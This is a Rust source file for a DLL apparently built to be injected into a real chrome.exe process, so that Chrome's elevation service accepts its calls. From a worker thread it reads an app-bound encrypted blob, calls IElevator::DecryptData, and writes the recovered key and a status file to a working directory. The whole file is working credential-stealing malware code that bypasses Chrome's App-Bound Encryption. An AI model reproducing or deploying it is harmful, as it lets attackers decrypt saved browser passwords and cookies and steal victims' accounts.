//! Payload DLL: injected into a real chrome.exe so the elevation service's
//! caller-path validation passes. DllMain spawns a worker thread (no heavy
//! work under the loader lock); the worker reads the app-bound payload file,
//! calls IElevator::DecryptData, and writes the key + status files.
//!
//! Built only by xbuild (direct rustc, --crate-type=cdylib, /ENTRY:DllMain).
//! Cargo never sees this file. No panics anywhere on this path: a panic
//! would abort the host chrome process.

#![allow(non_snake_case, non_camel_case_types, dead_code)]

mod shim;
mod ffi;
mod com;
mod typelib;

use crate::ffi::*;
use core::ptr::null_mut;

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(_h: HINSTANCE, reason: DWORD, _: LPVOID) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        unsafe {
            let start: LPVOID = worker as LPVOID;
            CreateThread(null_mut(), 0, start, null_mut(), 0, null_mut());
        }
    }
    TRUE
}

unsafe extern "system" fn worker(_: LPVOID) -> u32 {
    worker_impl();
    0
}

fn worker_impl() {
    unsafe { Sleep(1500) };
    let workdir = match std::env::var("CREDREAD_WORKDIR") {
        Ok(v) => v,
        Err(_) => return,
    };
    let status_path = format!("{workdir}\\status.txt");
    let write_status = |s: &str| {
        let _ = std::fs::write(&status_path, s.as_bytes());
    };
    let appb = match std::fs::read(format!("{workdir}\\appb.bin")) {
        Ok(b) if !b.is_empty() => b,
        _ => {
            write_status("ERR cannot read appb.bin");
            return;
        }
    };
    match crate::com::decrypt_app_bound(&appb) {
        Ok(key) => {
            let key_path = format!("{workdir}\\key.bin");
            if std::fs::write(&key_path, &key).is_err() {
                write_status("ERR cannot write key.bin");
                return;
            }
            write_status(&format!("OK keylen={}", key.len()));
        }
        Err(e) => {
            write_status(&format!("ERR {e}"));
        }
    }
}
